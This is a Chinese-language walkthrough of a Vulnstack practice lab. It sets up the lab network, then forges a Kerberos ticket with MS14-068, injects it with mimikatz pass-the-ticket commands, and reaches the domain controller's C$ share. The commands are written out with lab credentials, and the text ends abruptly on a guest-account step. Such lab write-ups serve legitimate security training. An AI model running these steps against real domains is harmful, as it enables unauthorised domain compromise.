本次内网渗透所用到的靶机为红日安全的ATT&CK第五个攻防靶场，网址：http://vulnstack.qiyuanxuetang.net/vuln/detail/7/

**一、环境搭建**

打开虚拟网络编辑器并添加两个虚拟网卡

VMnet5为仅主机子网配置为 10.0.0.0/24

VMnet7为桥接模式192.168.1.0/24

![](../Images/808eb2e79fbd866dc40f0ad76312e90e.png)

  

![](../Images/ffbef7a0f64d8a76505cc1089dffdf0a.png)

记得把方框中的选择去掉，因为仅主机模式默认是和本机建立专属网络通道的，也就是本机访问到仅主机模式的虚拟机，因此这里去掉让其访问不到，模拟真实的局域网环境。

然后打开靶机，开始配置网络。

![](../Images/68a1ce1ecc9be26ac5f361a1e75dbf49.png)

查看用户SID，为下一步域提权做准备。

![](../Images/0a0129a4e9041e65542b0a8c8850c343.png)

接下来使用MS14-068尝试一下域提权

MS14-068 参数解释

MS14-068.exe -u<userName>@<domainName> -p <clearPassword> -s<userSid> -d <domainControlerAddr>

结合以上收集到的信息，输入如下命令：

shell MS14-068.exe -uleo@sun.com -p 123.com -sS-1-5-21-3388020223-1982701712-4030140183-1110 -d 10.0.0.128

![](../Images/36e5056b172e767826f56419b47ae27a.png)

此时会生成TGT\_leo@sun.com.ccache的伪造缓存文件。

  

mimikatz kerberos::purge 清空当前机器中所有凭证

mimikatz kerberos::list查看当前机器凭证

![](../Images/89077ec87931a9574d33780f48dea524.png)

mimikatz kerberos::ptcTGT\_leo@sun.com.ccache 将票据注入到内存中

![](../Images/abc4d1e3da118252da2bc3b416b36e9f.png)

ls\\\\DC\\C$，查看域控C盘共享文件，域提权成功，下一步利用psexec登入到域控。

![](../Images/9ae6149c8aa5795416171f417ee47850.png)

**激活****guest****账户**

net user 1qaz@WSX
